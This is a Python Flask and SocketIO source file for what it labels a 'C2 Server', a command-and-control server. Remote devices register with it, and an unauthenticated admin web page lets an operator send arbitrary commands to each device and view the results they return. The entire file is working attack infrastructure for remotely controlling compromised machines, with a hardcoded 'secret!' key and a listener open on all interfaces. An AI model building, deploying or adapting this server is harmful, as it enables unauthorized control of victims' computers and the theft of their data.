from flask import Flask, request, render_template_string
from flask_socketio import SocketIO, emit, disconnect
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)

# Dictionary mapping unique device IDs to SocketIO session IDs
clients = {}

# Dictionary to store results for each device
results = {}

@app.route('/')
def index():
    # A simple HTML admin page to list clients and send commands.
    html = """
    <html>
      <head>
        <title>C2 Server - WebSocket</title>
      </head>
      <body>
        <h2>Connected Clients</h2>
        <ul>
          {% for device_id, sid in clients.items() %}
            <li>
              <strong>Device ID:</strong> {{ device_id }}<br>
              <form action="/send_command" method="post">
                  <input type="hidden" name="device_id" value="{{ device_id }}">
                  <input type="text" name="command" placeholder="Enter command">
                  <input type="submit" value="Send">
              </form>
              <strong>Last Result:</strong> {{ results.get(device_id, 'No result yet') }}
            </li>
          {% endfor %}
        </ul>
      </body>
    </html>
    """
    return render_template_string(html, clients=clients, results=results)

@app.route('/send_command', methods=['POST'])
def send_command():
    # Expects form data with device_id and command.
    device_id = request.form.get('device_id')
    command = request.form.get('command')
    if device_id in clients:
        sid = clients[device_id]
        # Emit the command to the client with the matching SocketIO session.
        socketio.emit('command', {'command': command}, room=sid)
        return f"Command '{command}' sent to device {device_id}"
    else:
        return "Device not found", 404

# SocketIO event handlers

@socketio.on('connect')
def handle_connect():
    print(f"Client connected: {request.sid}")

@socketio.on('register')
def handle_register(data):
    # Client should send a unique device_id for identification.
    device_id = data.get('device_id')
    if device_id:
        clients[device_id] = request.sid
        print(f"Registered device {device_id} with session {request.sid}")
        emit('registered', {'status': 'ok', 'device_id': device_id})
    else:
        disconnect()

@socketio.on('result')
def handle_result(data):
    device_id = data.get('device_id')
    result = data.get('result')
    if device_id:
        # Store the result for the device
        results[device_id] = result
        print(f"Result from {device_id}: {result}")

@socketio.on('disconnect')
def handle_disconnect():
    # Remove the client from our registry when they disconnect.
    sid = request.sid
    to_remove = None
    for device_id, session_id in clients.items():
        if session_id == sid:
            to_remove = device_id
            break
    if to_remove:
        del clients[to_remove]
        results.pop(to_remove, None)  # Remove the result for the disconnected device
        print(f"Device {to_remove} disconnected")

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
